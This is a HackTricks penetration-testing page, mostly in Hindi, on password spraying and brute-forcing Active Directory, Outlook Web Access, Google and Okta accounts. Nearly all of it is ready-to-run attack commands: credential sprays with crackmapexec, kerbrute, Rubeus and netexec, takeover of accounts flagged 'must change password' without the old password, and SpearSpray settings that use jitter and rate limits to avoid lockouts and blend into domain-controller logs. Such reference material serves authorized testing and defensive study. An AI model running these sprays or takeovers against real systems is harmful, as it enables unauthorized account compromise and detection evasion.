# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

एक बार जब आप कई **मान्य उपयोगकर्ता नाम** पा लेते हैं तो आप प्रत्येक खोजे गए उपयोगकर्ता के साथ सबसे अधिक प्रयुक्त **सामान्य पासवर्ड** आज़मा सकते हैं (पर्यावरण की पासवर्ड नीति को ध्यान में रखें).\\  
डिफ़ॉल्ट रूप से **न्यूनतम पासवर्ड लंबाई** **7** है।

सामान्य उपयोगकर्ता नामों की सूचियाँ भी उपयोगी हो सकती हैं: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

ध्यान दें कि आप **कुछ खातों को लॉकआउट कर सकते हैं यदि आप कई गलत पासवर्ड आज़माते हैं** (डिफ़ॉल्ट रूप से अधिकतर 10 से अधिक गलत प्रयासों पर)।

### पासवर्ड नीति प्राप्त करें

यदि आपके पास कुछ user credentials हैं या domain user के रूप में shell है तो आप **पासवर्ड नीति प्राप्त कर सकते हैं**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Linux (या सभी) से Exploitation

- **crackmapexec** का उपयोग:
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- [**kerbrute**](https://github.com/ropnop/kerbrute) का उपयोग करना (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(आप लॉकआउट से बचने के लिए प्रयासों की संख्या निर्दिष्ट कर सकते हैं):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) का उपयोग (python) - अनुशंसित नहीं, कभी-कभी काम नहीं करता
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- **Metasploit** के `scanner/smb/smb_login` मॉड्यूल के साथ:

![](<../../images/image (745).png>)

- **rpcclient** का उपयोग करके:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Windows से

- [Rubeus](https://github.com/Zer1t0/Rubeus) संस्करण के साथ जिसमें brute module शामिल है:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- With [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (यह डिफ़ॉल्ट रूप से डोमेन से उपयोगकर्ता उत्पन्न कर सकता है और डोमेन से पासवर्ड पॉलिसी प्राप्त करके उसके अनुसार प्रयासों को सीमित करेगा):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- के साथ [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### पहचानें और जब्त करें "Password must change at next logon" खाते (SAMR)

एक कम-शोर तकनीक है benign/empty password स्प्रे करना और उन खातों को पकड़ना जो STATUS_PASSWORD_MUST_CHANGE लौटाते हैं, जो संकेत देता है कि पासवर्ड जबरन समाप्त कर दिया गया है और पुराने पासवर्ड को जाने बिना बदला जा सकता है।

कार्यप्रवाह:
- उपयोगकर्ताओं का enumeration करें (RID brute via SAMR) ताकि लक्ष्य सूची बन सके:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spray an empty password और hits पर आगे बढ़ते रहें ताकि उन accounts को capture किया जा सके जिन्हें next logon पर बदलना होगा:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- प्रत्येक हिट पर, SAMR के जरिए NetExec’s module से पासवर्ड बदलें (जब "must change" सेट हो तो पुराने पासवर्ड की जरूरत नहीं होती):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
ऑपरेशनल नोट्स:
- Kerberos-based ऑपरेशनों से पहले सुनिश्चित करें कि आपका होस्ट क्लॉक DC के साथ सिंक में हो: `sudo ntpdate <dc_fqdn>`.
- कुछ मॉड्यूलों (उदा., RDP/WinRM) में (Pwn3d!) के बिना [+] का मतलब है कि creds वैध हैं लेकिन अकाउंट के पास interactive logon rights नहीं हैं।

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying SMB/NTLM/LDAP bind प्रयासों की तुलना में शोर कम करता है और AD lockout नीतियों के साथ बेहतर तरीके से संरेखित होता है। SpearSpray LDAP-driven targeting, एक pattern engine, और policy awareness (domain policy + PSOs + badPwdCount buffer) को जोड़कर सटीक और सुरक्षित तरीके से स्प्रे करता है। यह compromised principals को Neo4j में BloodHound pathing के लिए टैग भी कर सकता है।

Key ideas:
- LDAP user discovery paging और LDAPS support के साथ, वैकल्पिक रूप से custom LDAP filters का उपयोग।
- Domain lockout policy + PSO-aware filtering ताकि configurable attempt buffer (threshold) छोड़ा जा सके और users को लॉक होने से बचाया जा सके।
- Kerberos pre-auth validation fast gssapi bindings का उपयोग करते हुए (DCs पर 4625 के बजाय 4768/4771 उत्पन्न करता है)।
- Pattern-based, per-user password generation ऐसे variables का उपयोग करते हुए जैसे names और प्रत्येक user के pwdLastSet से निकले temporal values।
- Throughput control threads, jitter, और max requests per second के साथ।
- Optional Neo4j integration owned users को BloodHound के लिए mark करने के लिये।

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
लक्ष्य निर्धारण और पैटर्न नियंत्रण:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
स्टेल्थ और सुरक्षा नियंत्रण:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound एनरिचमेंट:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
पैटर्न सिस्टम अवलोकन (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Available variables include:
- {name}, {samaccountname}
- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition helpers and org token: {separator}, {suffix}, {extra}

Operational notes:
- सबसे अधिक अधिकारिक badPwdCount और नीति-संबंधी जानकारी पढ़ने के लिए -dc के साथ PDC-emulator को क्वेरी करना बेहतर है।
- badPwdCount का रीसेट observation window के बाद अगले प्रयास पर ट्रिगर होता है; सुरक्षित रहने के लिए threshold और timing का उपयोग करें।
- Kerberos pre-auth attempts DC telemetry में 4768/4771 के रूप में दिखाई देते हैं; मिश्रित रहने के लिए jitter और rate-limiting का उपयोग करें।

> Tip: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.

## Outlook Web Access

p**assword spraying outlook** के लिए कई tools मौजूद हैं।

- के साथ [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- के साथ [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- के साथ [Ruler](https://github.com/sensepost/ruler) (विश्वसनीय!)
- के साथ [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- के साथ [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

इन tools का उपयोग करने के लिए, आपको एक user list और एक password / एक छोटी सूची passwords की आवश्यकता होती है जिन्हें spray किया जाए।
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## संदर्भ

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)


{{#include ../../banners/hacktricks-training.md}}
